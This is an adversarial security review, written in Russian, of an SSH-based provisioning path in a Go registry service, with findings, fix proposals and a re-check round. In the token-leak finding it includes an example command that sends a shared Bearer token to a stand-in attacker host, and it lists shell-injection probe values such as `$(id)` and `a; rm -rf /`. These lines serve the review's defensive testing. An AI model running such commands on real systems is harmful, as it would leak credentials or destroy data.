# review-ssh-steps.md — независимое адверсарическое ревью SSH-пути шагов

Ветка `dev` @ `f622cd2` + незакоммиченный SSH-рефактор (Ansible удалён).
Scope: `registry/internal/sshx/*`, `registry/internal/control/{steps,profiles,operations,beget}.go`,
`registry/internal/provision/provision.go`, `registry/internal/server/{cabinet_beget,profiles_admin_api,profiles_user_api,cabinet_api,run_main_impl}.go`,
`registry/internal/{beget/client,config,cryptoutil}`, `ui/` панели профилей,
`docs/api-contract.md §8`. Read-only: код не менялся; запускались только тесты и
внешний probe (`/tmp`, копия `RenderStep`). Единственный записанный файл — этот отчёт.

Метод: чтение источников; прогон целевых тестов (`provision`, `control`, `sshx`,
`server` — все ok); эмпирическая проверка шаблонизатора точной копией
`RenderStep`/`ShellQuote`/`ProfileVarNames` во внешнем модуле.

## VERDICT

**NO-GO для прода как есть.** Ansible-класс (RCE на регистраторе, `review-addendum.md`)
**мёртв** — пакета `internal/ansible` нет, YAML/песочницы нет, `gopkg.in/yaml.v3`
убран из `go.mod`; все находки `review-addendum.md` неприменимы. Инъекция **через
значение переменной** действительно невозможна (подтверждено). Но у нового пути
четыре HIGH-дефекта (деньги/контракт/идемпотентность) и один из них делает
реальную установку **невыполнимой** в HTTP-потоке. Деньги-инварианты, кроме
утечки слота, держатся. После H1–H4 (правки локальные) — GO.

| # | Sev | Тема | Вердикт |
|---|-----|------|---------|
| H1 | HIGH | (d/c) весь `Provision` под 30-сек context → реальная установка/ready-timeout не успевают | **FALSE** — конфиг-таймауты недействуют |
| H2 | HIGH | (a) контракт `{{ var }}` не работает, код требует `{{.var}}` | **FALSE** — все профили по документации падают |
| H3 | HIGH | (c) многострочный/пайповый шаг не fail-fast → ложный `done` | **FALSE** |
| H4 | HIGH | (d) утечка слота квоты при ошибке валидации после `AuthorizeNode` | **FALSE** |
| M5 | MED | (b) `node_token` (общий Bearer реестра) инъектится в пользовательские шаги | риск утечки общего креденшела |
| M6 | MED | (f) retry перевыдаёт `node_secret`, а установщик не перезаписывает его | агент теряет auth |
| M7 | MED | (a) leading-dash / option-injection не нейтрализуется shell-квотингом | ограничение профиля |
| M8 | MED | (f) штатный профиль не передаёт `--name` (вопреки impl-summary) | хрупкая фиксация id |
| L9 | LOW | (c) truncate ДО mask при значении >2000 симв б | частичная утечка |
| L10 | LOW | (b) хост-ключ не пинится (задокументировано) | — |
| L11 | LOW | (e) устаревший комментарий "для Ansible" + `go.sum` yaml.v3 | — |

Подтверждены (фальсификация не удалась): инъекция через значение (a);
привязка хоста (b); отсутствие чтения секретов реестра (b); деньги-инварианты
(d, кроме H4); мёртвый ansible/yaml (e); предсозданная личность (f).

---

## HIGH-1 — весь поток провижининга выполняется под 30-секундным context

**Файлы:** `registry/internal/server/cabinet_beget.go:57-59,339-347,628-631`,
`registry/internal/provision/provision.go:448-464,505-537,543-578`.

```go
func providerCtx(req *http.Request) (context.Context, context.CancelFunc) {
    return context.WithTimeout(req.Context(), 30*time.Second)   // :58
}
...
ctx, cancel := providerCtx(req)          // :339
...
op, err := prov.Provision(ctx, ...)      // :342
```

`Provision` внутри делает: платный `CreateVps` → `waitRunning` (окно
`vps_ready_timeout_min`, дефолт **10 минут**) → `WaitSSH` (до 20 попыток × 30с) →
шаги SSH (таймаут шага `install_timeout_min`, дефолт **20 минут**). Всё это под
**одним 30-секундным** `ctx`:

- `waitRunning` (`provision.go:458-460`) выходит по `<-ctx.Done()` через 30с →
  состояние `waiting_vps` даже при `vps_ready_timeout_min=10`.
- `sshx.Run` (`sshx.go:115,166-169`) отменяет dial/шаги по `ctx.Done()` → первый
  же шаг убивается на ~30-й секунде; `install_timeout_min` недостижим.
- Тот же дефект в `handleOperationRetryInstall` (`cabinet_beget.go:628-631`).

Тесты этого не ловят: `fakeBeget`/`fakeRunner` мгновенны и игнорируют deadline.
В проде это значит: оплаченный VPS **никогда** не устанавливается синхронным
`POST /api/me/vps` → пользователь платит, нода не встаёт, слот держится.

**Фикс (выбрать один):**
1. Правильный: вынести провижининг из запроса в фоновый воркер (как и помечено
   `// ponytail: sync flow`); `POST` возвращает `pending/installing`, клиент
   опрашивает `GET /api/me/operations`.
2. Минимальный: для `Provision`/`RetryInstall` брать отдельный контекст
   `context.WithTimeout(context.WithoutCancel(req.Context()),
   VpsReadyTimeout + N*StepTimeout + margin)` — но тогда POST висит десятки
   минут (реверс-прокси/клиент оборвут); приемлемо только как hotfix.

---

## HIGH-2 — документированный синтаксис `{{ var }}` не работает

**Файлы:** `registry/internal/control/steps.go:65,84-104`,
`docs/api-contract.md:299`, `ui/pages/cabinet/main.ts:391`,
`registry/internal/control/profiles.go:219-228`.

`profileVarRe = regexp.MustCompile("\\{\\{\\s*\\.(\\w+)\\s*\\}\\}")` требует
**точку**; `RenderStep` выполняет `text/template` над `map[string]string`, где
действие — `.name`. Контракт §8.3 озаглавлен «Переменные профиля ({{ var }}, §6)»,
подсказка UI — «`{{ var }}` подставляется». Проверено probe (копия
`RenderStep`):

```
tmpl="echo {{ port }}"   -> err=template: step:1: function "port" not defined
tmpl="echo {{.port}}"    -> "echo '443'"
```

Любой профиль, написанный по документации/подсказке UI (`--port {{ port }}`),
падает на рендере → шаг `failed`, установка не встаёт. Штатный профиль по
счастливой случайности использует `{{.port}}` (`profiles.go:220-227`), поэтому
баг не виден на дефолте.

**Фикс:** либо поддержать оба синтаксиса (пред-преобразование `{{ name }}` →
`{{.name}}` перед `Parse`, с оговоркой на shell `{{`), либо жёстко обновить
контракт §8.3 + подсказку UI (`main.ts:391`) + `vars_schema`-доку на `{{.var}}`.
Рекомендую первое (контракт обещан пользователям).

---

## HIGH-3 — многострочный/пайповый шаг не fail-fast → ложный `done`

**Файлы:** `registry/internal/provision/provision.go:374-395`,
`registry/internal/sshx/sshx.go:142`.

`runSteps` считает шаг успешным по `res.Code == 0`, но `sess.Run(command)`
исполняет **всё** тело шага одной командой через login-shell без `set -e`.
Код возврата = код *последней* команды:

- Штатный шаг 3 (`profiles.go:227`): `curl -fsSL <url> | sudo bash -s -- ...`.
  При недоступном URL `curl -f` печатает ничего и падает, `bash` получает пустой
  stdin и выходит **0** → шаг «успешен», профиль `done`, агент не установлен.
- Любой многострочный шаг с ошибкой в середине, но успешным последним
  оператором, тоже «успешен» (напр. `install -d ...` упал, `printf ...` прошёл).

`TestApplyProfileAbortsOnFirstFailure` проверяет только гранулярность «шага»
(мок возвращает ненулевой код), не пайп/многострочность.

**Фикс:** исполнять тело шага под `set -euo pipefail`. Надёжно — через bash:
`sshx.Run(..., "bash -euo pipefail -c "+ShellQuote(command), ...)` (значение уже
квотируется; одинарные кавычки вокруг всей команды экранировать `ShellQuote`),
либо префикс `set -euo pipefail` (bash есть на целевых Debian/Ubuntu). Добавить
тест: шаг `false` в середине `false\ntrue` → ненулевой итог.

---

## HIGH-4 — утечка слота квоты при ошибке валидации после `AuthorizeNode`

**Файл:** `registry/internal/server/cabinet_beget.go:308-338`.

Порядок в `handleMeVps`: `AuthorizeNode(nodeID)` (`:308`, резервирует место в
`node_owners` **до** платного вызова — верно для §7.1), затем:

- `MergeProfileVars` (`:318`) → 400 при невалидном имени переменной/размере;
- `provisionVars` (`:323`);
- `ValidateExtraVars` (`:328`) → 400;
- `sshAuthFor` (`:334`) → 400 `ssh_creds_unavailable`.

Ни один из этих путей **не вызывает `ReleaseNode`** (`ReleaseNode` в
`cabinet_beget.go` есть только в отмене `:535`). Итог: `node_owners`-строка
(`nodeID = nodeIDForIdem(idem_key)`) остаётся привязанной к пользователю без
операции/VPS. `UsedSlots` считает `node_owners` → при `MaxNodes=1` следующий
`POST /api/me/vps` падает на advisory-проверке `:282-288` (`used >= u.MaxNodes`)
→ `403 quota_exceeded`. Триггер тривиален: тело с `vars:{"bad-name":"x"}`.

Это тот же класс, что закрытый MED-5 (`review-addendum.md`), но на **собственном**
пути валидации хендлера; тесты `TestCreatePreSendFailureReleasesSlot` его не
покрывают (там путь `provision.Create`).

**Фикс:** либо освобождать слот на каждой ветке `:318-338`
(`defer`/`ReleaseNode` по ошибке), либо — чище — перенести `AuthorizeNode` на
позицию непосредственно перед `prov.Provision` (`:342`), после `MergeProfileVars`
+ `ValidateExtraVars` + `sshAuthFor`. Порядок «резерв до платного вызова» при
этом сохраняется, но `provisionVars` требует уже созданной `node_owners`-строки —
значит `AuthorizeNode` ставится перед `provisionVars` (после валидации vars и
получения auth). Тест: POST с невалидным именем переменной → `UsedSlots` не
вырос.

---

## MEDIUM-5 — `node_token` (общий Bearer реестра) попадает в пользовательские шаги

**Файл:** `registry/internal/server/cabinet_beget.go:401-408`.

```go
nodeToken := r.cfg.Security.NodeToken
...
if nodeToken != "" { vars["node_token"] = nodeToken }
```

`provisionVars` вызывается для **любого** профиля, включая пользовательский
(`published=false`, создаётся через `POST /api/me/profiles`). Пользователь может
задать шаг `curl -d @- http://attacker/ <<< {{.node_token}}` (probe подтвердил,
что значение подставляется в команду, исполняемую на его VPS). Плюс маскирование
в `last_error` не спасает — значение уходит по сети **из команды**, а не из
вывода.

`node_token` — общий Bearer: при `legacySharedSecretEnabled=true` (дефолт)
`gateMachineAuth` (`api_auth.go:135-137`) принимает его на всех machine-маршрутах
без привязки к `node_id` → любой держатель может действовать за любую ноду.

Смягчает: общий токен и так кладётся установщиком в `node.toml` на VPS
пользователя (`install_node.sh:434`), т.е. владелец VPS в принципе читает его и
без этого. Поэтому это не новый cross-tenant RCE, но лишняя поверхность и
противоречие §7.1 (персональный `node_secret` должен быть основным креденшелом).

**Фикс:** не инъектить `node_token` в vars вообще (агент авторизуется
`node_secret`; `install_node.sh` перестать требовать `--registry-token`, либо
инъектить его только для штатного профиля `sharedd-node`). Крайняя мера —
отключить `legacySharedSecretEnabled` по умолчанию.

---

## MEDIUM-6 — retry-install ломает auth агента (перевыдача `node_secret`)

**Файлы:** `registry/internal/server/cabinet_beget.go:605,631`,
`registry/internal/control/nodes_secret.go:18-34`, `scripts/install_node.sh:456-458`.

`RetryInstall` → `provisionVars` заново генерирует `node_secret` и `SetNodeSecret`
**затирает** старый хеш (`nodes_secret.go:14-34`). Но `install_node.sh`
`add_registry_key` «дописывает только если ключа ещё нет, существующее не
трогает» (`:450-458`): на повторном прогоне `registry.node_secret` в
`node.toml` **не обновится**. Агент продолжит слать старый секрет, которого в
реестре уже нет → `401` на всех machine-маршрутах. То есть `retry-install` после
частично прошедшей установки способен «обесточить» живого агента.

Помечено в impl-summary (риск 3), но для §7.2 это значимо: retry — штатный
способ починить упавшую установку, а он не может пересинхронизировать секрет.

**Фикс:** на retry не перевыдавать секрет, если он уже выдан (брать/подтверждать
существующий), **или** научить установщик перезаписывать `node_secret` для уже
предсозданной ноды (`add_registry_key --force` только для этого ключа).

---

## MEDIUM-7 — shell-квотинг не нейтрализует option-injection (leading dashes)

`ShellQuote` (`steps.go:61-63`) корректно защищает от word-splitting/подстановок,
но значение, подставленное в **позицию опции**, остаётся опцией:
`rm {{.v}}` с `v="-rf"` → `rm '-rf'` (кавычки снимает shell, `rm` видит `-rf`).
Штатный профиль безопасен: значения идут только как `--flag={{.v}}` или
позиционно после известной опции (`profiles.go:220,224,227`). Это ограничение для
авторов профилей, не дыра.

**Фикс:** в подсказке UI/контракте требовать `--flag={{.v}}`/`--`; при желании —
санитайзить значения, начинающиеся с `-` (кроме явно объявленных).

---

## MEDIUM-8 — штатный профиль не передаёт `--name` (вразрез impl-summary §7.1)

**Файл:** `registry/internal/control/profiles.go:219-228`, `scripts/install_node.sh:402-420`.

`DefaultProfileSteps` пишет `/var/lib/sharedd/node_id` (`profiles.go:224`), но
`install_node.sh` не получает `--name`, поэтому весь блок reuse/generate id
(`:402` `if [ -n "$NODE_NAME" ]`) пропускается. Идентичность держится **только**
на предзаписанном файле, который читает агент (`config.ResolveID` →
`LoadOrGenerateRandomID`: валидный id из файла возвращается как есть —
`node/internal/config/config.go`). `nodeIDForIdem` (`cabinet_beget.go:238-242`)
даёт валидный `NAME-HASH` (`vps<6hex>-<5hex>`), так что register под тем же id —
ок. Но impl-summary §7.1 утверждает, что «плейн-секрет передаётся шагу установки
(`--name`, `--node-secret`)» — `--name` фактически отсутствует; при тихом отказе
шага записи (см. H3) агент сгенерирует случайный `node-xxxxx` и получит `403`
на `/register` (fail-closed: второй слот **не** сожжёт, но поток сломан).

**Фикс:** добавить `--name={{.node_id}}`? Нельзя: `--name` ожидает имя без
хеша, а `install_node.sh` тогда может **перегенерировать** id. Правильнее —
оставить как есть, но (1) исправить impl-summary, (2) сделать шаг записи
атомарно-проверяемым (`grep -qxF {{.node_id}} /var/lib/sharedd/node_id || exit 1`)
под H3-fix.

---

## LOW-9 — truncate раньше mask может утечь длинный секрет

**Файл:** `registry/internal/provision/provision.go:369,588-594`.

`MaskSecrets(truncateOutput(output), secrets)`: при значении секрета длиннее cap
`truncateOutput` (**2000**) в выводе остаётся его обрезанный префикс, который
`ReplaceAll` по полной строке уже не найдёт. `MaxVarValueLen = 4096`
(`profiles.go:351`) допускает такие значения. Утечка — владельцу операции в
`last_error`, т.е. его же секрет; severity низкая.
**Фикс:** маскировать до обрезки (`truncateOutput(MaskSecrets(output, secrets))`).

---

## LOW-10 — хост-ключ VPS не пинится

`sshx.go:60` `ssh.InsecureIgnoreHostKey()`. Задокументировано (шапка пакета,
impl-summary риск 2); приемлемо для свежесозданного VPS. **Когда добавить:** при
появлении долгоживущего инвентаря — `known_hosts`/TOFU. Не блокер.

---

## LOW-11 — мусор/устаревшее

- `registry/internal/control/beget.go:4` — комментарий «для Ansible» (stale).
- `registry/go.sum:51-52` — остаточные строки `gopkg.in/yaml.v3`; в `go.mod`
  зависимости нет (проверено). Безвредно; `go mod tidy` уберёт.
- `sshx.go:163-168` — kill при таймауте best-effort (`sess.Signal` не гарантирует
  смерть удалённого процесса). Пометить комментарием.

---

## Confirmed-sound (фальсификация не удалась)

- **(a) инъекция через значение переменной — НЕВОЗМОЖНА.** `ShellQuote` →
  `'…'\''…'`, применяется ровно один раз в `RenderStep` (`steps.go:84-104`);
  probe: `$(id)`, `` `id` ``, `a; rm -rf /`, `a'b`, `a\nb` остаются внутри
  одинарных кавычек. Значение с кавычкой не разрывает аргумент. `strVars` через
  `fmt.Sprint` (provision.go:364-367) не обходит квотинг. missing var → `''`
  (не `<no value>`). *(Оговорки — H2-синтаксис и M7-опции.)*
- **(b) привязка хоста.** `target.Host` = IP из `beget.GetInfo(op.ProviderVPSID)`
  (`provision.go:451-453,533,567-574`), `User` = `"root"` (`cabinet_beget.go:347,631`,
  `provision.go:580-585`), `Auth` = расшифрованный из Beget-связки владельца
  (`sshAuthFor`, `cabinet_beget.go:423-439`); порт 22. Ни host/port/user не
  приходят из тела. Операция owner-проверяется до `RetryInstall`
  (`cabinet_beget.go:561-564`).
- **(b) чтение секретов реестра невозможно.** Шаги исполняются на VPS
  пользователя; SSH-клиент не отдаёт ФС регистратора. Приватный ключ — в памяти
  (не temp-файл). `node_secret` не возвращается ни одним read-эндпоинтом
  (только `POST /register`, `run_main_impl.go:298-309`, `no-store`); не логируется.
- **(d) деньги (кроме H4).** Ровно один `CreateVps` на `idem_key`
  (`operations.go:76-92,115-146` UNIQUE + `MarkCreateSent` CAS `:244-253`);
  retry не зовёт `Create` (`provision.go:543-578`, тест `TestRetryInstallZeroCreateVps`);
  `waiting_vps` держит место (state не в `('failed','deleted')`, `UsedSlots`);
  нет SSH-кредов → durable `failed` без заказа (`provision.go:507-518`,
  `TestProvisionNoSSHCredsFailsWithoutOrder`); предсозданная личность работает
  (`AuthorizeNode` + `SetNodeSecret` + register по секрету).
- **(e) ansible/yaml мертвы.** `internal/ansible` отсутствует; `SetRunner`/
  `PlaybookRunner`/`playbooks_dir` не встречаются; `gopkg.in/yaml.v3` вне `go.mod`;
  упоминания «Ansible/playbook» — только историческая колонка БД и комментарии.
- **(f) фиксация node_id.** Штатный профиль пишет `/var/lib/sharedd/node_id`;
  агент читает файл и использует валидный id как есть; `install_node.sh` без
  `--name` файл не трогает → повторный прогон сохраняет id (и слот).
  *(Оговорки — H3, M6, M8.)*

---

## Pre-deploy checks (точные)

1. **Обязательные фиксы:** H1 (ctx/async), H2 (синтаксис), H3 (`set -euo pipefail`),
   H4 (release/перенос `AuthorizeNode`). Без них — NO-GO.
2. Регресс-тесты (добавить):
   - шаг `false\ntrue` (и `curl bad | bash`) → профиль `failed`, не `done`;
   - `RenderStep("--port {{ port }}")` → подставляет (H2), и `{{.port}}` тоже;
   - `POST /api/me/vps` с `vars:{"bad-name":"x"}` → `UsedSlots` не вырос (H4);
   - провижининг с медленным `GetInfo`/шагом >30с → не обрывается по ctx (H1).
3. Прогон: `cd registry && gofmt -l . && go vet ./... && go test -race -count=1 ./... && go build -mod=readonly ./... && golangci-lint run ./...` (AGENTS.md).
4. Если H2 решается в пользу `{{.var}}` — обновить `docs/api-contract.md:299`,
   подсказку `ui/pages/cabinet/main.ts:391` и `bash scripts/build_ui.sh -check`.
5. Уточнить у владельца политику `node_token` (M5) и поведение retry-секрета (M6)
   до включения провижининга пользователям.
6. E2E на живом VPS (sandbox-аккаунт Beget): `sharedd-node` против реального
   `install_node.sh` + `POST /register` по выданному `node_secret`; повторная
   отправка → ноль новых `CreateVps`, id агента == предсозданному.

---

## Re-check round 2

Ветка `dev` @ `f622cd2` + незакоммиченные правки H1–H4/M5/M6/M8/L9/L11.
Read-only: продуктовый код не менялся; записан только этот раздел. Метод —
чтение источников + **эмпирика** (build/vet/tests + внешний probe точной копии
`RenderStep`/`ShellQuote`/`ProfileVarNames` в `/tmp` + прямой прогон
`install_node.sh` / `bash -eo pipefail`).

Прогон:
```
cd registry
  gofmt -l .                       → пусто
  go build -mod=readonly ./...     → ok
  go test -race -count=1 ./internal/control ./internal/provision ./internal/server → all ok
  go test -race -count=1 -run '<H1..M8 fix tests>' ./internal/... → все PASS
scripts: bash -n install_node.sh install_node_web.sh → ok; check_installer_parity → ok
```

### Вердикт по ID

| # | Тема фикса | Вердикт |
|---|------------|---------|
| H1 | async-воркер, бюджет, guard, shutdown, один `CreateVps` | **PASS** (деньги-инвариант держится; остаточные DEF-C/DEF-D) |
| H2 | оба синтаксиса `{{ var }}` / `{{.var}}`, квотинг ровно один раз | **PASS** (полностью, включая враждебные значения и коллизии имён) |
| H3 | pipefail + verify-шаг | **PASS** для fail-fast; verify-шаг **НЕ доказывает регистрацию** → DEF-B |
| H4 | отсутствие утечки слота квоты | **PASS** |
| M5 | `node_token` не инъектится | **PASS** |
| M6 | retry не перевыдаёт старый секрет, не бриклит живой агент | **PASS** по заявленным свойствам, но retry-путь сломан → **DEF-A** |
| M8 | default-профиль передаёт `--name`, установщик принимает NAME-HASH | **PASS** |
| L9 | маскирование до обрезки | **PASS** |
| L11 | убран stale-комментарий про Ansible | **PASS** |

### H2 — подтверждено эмпирически

Probe (точная копия функций) на `echo {{ v }}`:

- формы `{{ testvar }}`, `{{.testvar}}`, `{{  testvar  }}`, `{{testvar}}`,
  `{{ .testvar }}`, смешанная `{{ testvar }} … {{.other}}` → все рендерятся.
  Единственная недокументированная `{{ . testvar }}` (пробел между точкой и
  именем) падает — но её нет ни в контракте §8.3, ни в UI; не блокер.
- враждебные значения `a'b`, `$(id)`, `` `id` ``, `a\nb`, `a; rm -rf /`,
  `--flag`, `"; id; "` → **обёрнуты в одинарные кавычки ровно один раз**
  (`echo 'a'\''b'`), shell-инъекция невозможна.
- значение с template-делимитерами (`{{ printf "%s" .x }}`, `{{.node_secret}}`,
  `{{if}}`, `}}`, `{{`) **не ре-экспандится** — остаётся внутри кавычек.
- значение == control-слову (`if`/`else`/`end`/`range`/`with`/`template`/
  `define`/`block`) → `{{ if }}` нормализуется в `{{.if}}` → `'if'`, не ломает
  рендер.
- имя переменной, коллизящее с функцией text/template (`printf`, `len`,
  `index`, `call`, `html`, `js`, `urlquery`, `and`, `or`, `not`, `eq`, `slice`)
  → пользовательская функция перекрывает встроенную → `'printf'`, **квотинг не
  обходится**.
- отсутствующая переменная → `''` (не `<no value>`).

### H1 — подтверждено

- **Отвязанный ctx + бюджет**: `provisionWorker.run` использует
  `context.WithTimeout(w.ctx, timeout)`, `w.ctx` = `context.Background()`;
  бюджет `ProvisionBudget = VpsReadyTimeout + (n+1)×StepTimeout + 5m`
  (`provision.go:256`, `TestProvisionBudgetUsesConfiguredTimeouts`). Запросный
  30-сек ctx к воркеру неприменим.
- **Один запуск на операцию**: guard-карта по `opID` (`run` возвращает false на
  повтор; `TestProvisionWorkerGuardsOperation`). Retry дополнительно
  сериализуется CAS `MarkInstallingIfActive` (installing/`done` не перезапускаются).
- **Shutdown**: `reg.provisionWorkers().stop()` после `serveHTTP`
  (`run_main_impl.go:179`, `TestProvisionWorkerDetachedCtxAndStop`).
- **Ни одного второго `CreateVps`**: `CreateVps` зовётся ТОЛЬКО в
  `runCreated`; воркер и retry зовут `InstallOnConfirmed` (WaitRunning + шаги).
  Тесты: `fake.creates()==1`, `TestRetryInstallZeroCreateVps`.
- **Ответ**: `POST /api/me/vps` возвращает `toOperationJSON` — для
  подтверждённого заказа `state="confirmed"`, `has_vps=true`. UI
  (`ui/pages/cabinet/main.ts`) поллит `GET /api/me/operations` каждые 5с и
  рисует `installing`/`waiting_vps`/`done`/`failed` + кнопку retry → переходы
  `confirmed→installing→done|failed|waiting_vps` наблюдаемы.

### H3 — подтверждено (fail-fast), verify-шаг недостаточен (DEF-B)

- `runSteps` исполняет каждый шаг как `bash -eo pipefail -s`, тело — на stdin
  (`provision.go:441`); `sshx.Run` кладёт stdin в `sess.Stdin` (`sshx.go:134`).
- `TestApplyProfileFailFastPipeAndMultiline` (реальный bash):
  `false\ntrue` → fail; `false | bash` → fail; `# verify\nfalse` → fail;
  контрольный `true\necho ok` → pass. Прямая проверка
  `bash -eo pipefail -s <<<'false; echo X'` → RC=1. **PASS**.
- **Но verify-шаг не доказывает регистрацию** (см. DEF-B): `systemctl is-active
  --quiet sharedd-node-agent` + `curl /healthz` (реестра) — оба зелёные, даже
  если агент не смог `/register`.

### H4 — подтверждено; перечислены все пути

До `AuthorizeNode` (слот не занят): `selectableProfileVersion`,
`verifiedBegetClient`, `MergeProfileVars`, `sshAuthFor` — расшифровка ключа.
`AuthorizeNode` — последним. После `authorized=true` каждый выход либо
`return` через `defer`-release, либо передаёт владение `provision`:

| Путь после резерва | Что делает | Утечка? |
|---|---|---|
| `provisionVars` err | `return` → `defer` ReleaseNode | нет |
| `ValidateExtraVars` err (400) | `return` → `defer` ReleaseNode | нет |
| `prov.Create` err и `op.ID==0` (квота/cooldown/…) | `return` → `defer` ReleaseNode | нет |
| `prov.Create` ok, `state=failed` (регион) | `runCreated` уже вызвал ReleaseNode; `authorized=false` (defer не сработает) | нет |
| `prov.Create` ok, `sent`/`unknown` | слот держится (платный вызов в полёте) — верно | нет |
| `prov.Create` ok, `confirmed` | слот держится (cloud_resources+op) до release-node — верно | нет |

**Двойной release невозможен**: `defer` срабатывает ровно один раз и только при
`authorized==true`; сразу после `Create` флаг снят (`cabinet_beget.go:366`).
`ReleaseNode` идемпотентен (UPDATE→legacy + DELETE reservation; повтор безвреден),
так что даже гипотетический повтор не ошибка. `TestMeVpsLateValidationNoSlotLeak`
(bad-name, value-too-long) подтверждает `UsedSlots` неизменен и следующий
корректный заказ проходит.

### M5 — подтверждено

`provisionVars` пишет только `registry_url`/`node_id`/`node_secret`;
`node_token`/`Security.NodeToken` в vars не попадают нигде (grep: только
`api_auth.go`, `config_editor.go`). Штатный профиль использует персональный
`node_secret` как Bearer. `TestProvisionVarsExcludeSharedNodeToken` — PASS.

### M6 — свойства держатся, recovery мёртв (DEF-A)

- `provisionVars(..., false)` при `NodeHasSecret` → секрет НЕ перевыдаётся; хеш
  живого агента сохраняется (`TestRetryInstallKeepsExistingSecret` — PASS).
- **Что с нодой, чей плейн-секрет не доставлен: аккаунт НЕ восстановим** через
  retry — см. DEF-A. Единственное «решение» сейчас — `--force`/пересоздание
  ноды (вне контракта).

### M8 — подтверждено

`DefaultProfileSteps` шаг 3 передаёт `--name={{ node_id }}` и
`--registry-token={{ node_secret }}`; probe рендера даёт
`--name='vpsab12cd-3f4a5'`. Оба установщика (`install_node.sh:411`,
`install_node_web.sh:247`) принимают полный `NAME-HASH` и фиксируют его как есть.
`vps<6hex>-<5hex>` (имя 9 симв.) матчит и общий, и full-NAME-HASH regex.
Реальные строки `systemctl is-active --quiet sharedd-node-agent` и отсутствие
`node_token` — `TestDefaultProfileStepsContract` PASS.

---

### Выжившие дефекты

**DEF-A — HIGH (функциональный): `retry-install` рендерит `--registry-token=''`, установщик падает.**
После любого create секрет уже выдан (`rotateSecret=true`), поэтому при retry
`NodeHasSecret=true` → `node_secret` НЕ попадает в vars → `RenderStep` подставляет
пропущенную переменную как `''`. Probe (точная копия `RenderStep` над дословным
шагом 3 из `profiles.go:230`, vars без `node_secret`):

```
curl … | sudo bash -s -- --registry='https://reg.example' --name='vpsab12cd-3f4a5' --registry-token='' --node-secret=''
```
`install_node.sh:164-168` требует непустой token (`--registry` ставит
NONINTERACTIVE=1 → чтения нет) → `die "нужен обязательный Node API token"`.
Прогон подтверждает: `REGISTRY_TOKEN=""` → die.
**Итог:** §7.2 retry-install не работает для штатного профиля — упавшую установку
починить нельзя, слот/оплаченный VPS остаются висеть. Это прямой регресс от
M6-фикса. Тест `TestRetryInstallKeepsExistingSecret` его не ловит: `fakeExec`
не исполняет реальный установщик (no-op).
*Repro:* POST /api/me/vps → дождаться `failed` (или подменить install-шаг на
`false`) → POST retry-install → шаг 3 падает на пустом token; op снова `failed`.
*Фикс:* не выводить `node_secret` из обязательных аргументов шага: либо
подставлять уже сохранённый Bearer через иное поле агента, либо отдельный
retry-совместимый шаг, либо `--registry-token` брать из уже записанного в
`node.toml` (без затирания). Плюс регресс-тест на ВАЛИДНОСТЬ рендеремой команды
при существующем секрете.

**DEF-B — MEDIUM: verify-шаг доказывает «юнит активен», но не регистрацию.**
`node/internal/agent/main.go` при провале `/register` (401/403/429) не выходит:
`register()` только логирует, `metricsLoop` блокирует main-горутину; unit имеет
`Restart=always`. Значит `systemctl is-active --quiet sharedd-node-agent` зелёный,
а `{{ registry_url }}/healthz` — это здоровье реестра, не факт регистрации.
Нода, установившая агента, но не зарегистрировавшаяся (несовпадение
`node_secret`, 403-карантин, порт), даст ложный `done`.
*Repro:* выдать неверный `node_secret` (или порт ≠ `shared_proxy.port`) →
установка «успешна», `done`; на реестре ноды нет.
*Фикс:* verify должен проверять факт регистрации извне (реестровая ручка статуса
по node_id/секрету) или агент должен ненулевым кодом/таймаутом сигналить о
провале первого `/register`.

**DEF-C — MEDIUM: рестарт реестра в середине установки оставляет op в `installing` навсегда.**
Работа воркеров не персистится; `MarkInstallingIfActive` блокирует retry при
`installing` (handler `:604-606`), а фонового resume-installing нет. После
перезапуска операция застревает, retry-refused, ручного пути нет.
*Repro:* POST /api/me/vps → убить реестр во время install → рестарт →
POST retry-install → 409 `in_progress` бессрочно.

**DEF-D — LOW: гонка чтения конфига.** `provisionConfig()` читает
`r.cfg.Provisioning.*` без `cfgMu`, тогда как config_editor пишет под `cfgMu` —
потенциальная data race при hot-apply (значения — int, практический вред
минимален; `-race` в CI не покрывает сценарий hot-apply+create).

### Деньги-безопасность end-to-end с новым воркером

Держится. Единственный `CreateVps` — синхронно в `runCreated` под
`MarkCreateSent` CAS; воркер/retry делают только `InstallOnConfirmed` (WaitRunning
+ шаги). `pending`-строка до платного вызова; `sent/unknown/waiting_vps` держат
слот; региональная ошибка освобождает слот до/без подтверждения; отмена
`pending→failed` освобождает, `sent` — нет. Второго платного вызова ни один путь
воркера не вводит. **DEF-A не нарушает деньги-инвариант, но ломает штатное
восстановление (VPS оплачен и простаивает).**

### GO / NO-GO

- **NO-GO для включения пользовательского провижининга** — DEF-A: документированный
  §7.2 recovery (retry-install) неработоспособен для штатного профиля; падение
  установки = оплаченный VPS + занятый слот без пути восстановления.
- **GO для самого SSH-пути шагов** после закрытия H1–H4/M5/M8: инъекция через
  значение невозможна (H2 квотинг подтверждён эмпирически), деньги-инвариант
  сохранён, песочница/Ansible мертвы. DEF-B/C/D — не блокеры безопасности, но
  DEF-B стоит закрыть до прода (ложный `done`).

### Pre-deploy checks (точные)

1. **Обязательно до включения провижининга:** DEF-A — retry-install должен
   выдавать валидную команду при существующем секрете. Регресс-тест: рендер
   штатного шага 3 с vars без `node_secret` НЕ содержит `--registry-token=''`
   (и/или прогон `install_node.sh` с ним не `die`).
2. DEF-B: verify-шаг проверяет факт `/register` (или агент фейлит таймаут
   первого register). Регресс: нода с неверным секретом → install `failed`.
3. DEF-C: при старте — до-подхват операций в `installing` (или разрешить
   retry из `installing`). Регресс: restart-mid-install → retry не 409-навсегда.
4. Прогон (AGENTS.md): `cd registry && gofmt -l . && go vet ./... &&
   go test -race -count=1 ./... && go build -mod=readonly ./... &&
   golangci-lint run ./...`; затем `cd node && …`.
5. Установщики: `bash -n scripts/*.sh && shellcheck -S warning scripts/*.sh &&
   bash scripts/check_installer_parity.sh` (сейчас чисто).
6. E2E на живом VPS (sandbox Beget): `sharedd-node` против реального
   `install_node.sh`; `POST /register` по выданному `node_secret`; повторный
   `POST /api/me/vps` → ноль новых `CreateVps`; id агента == предсозданному;
   **retry-install после искусственного падения шага → успех (закрывает DEF-A)**.
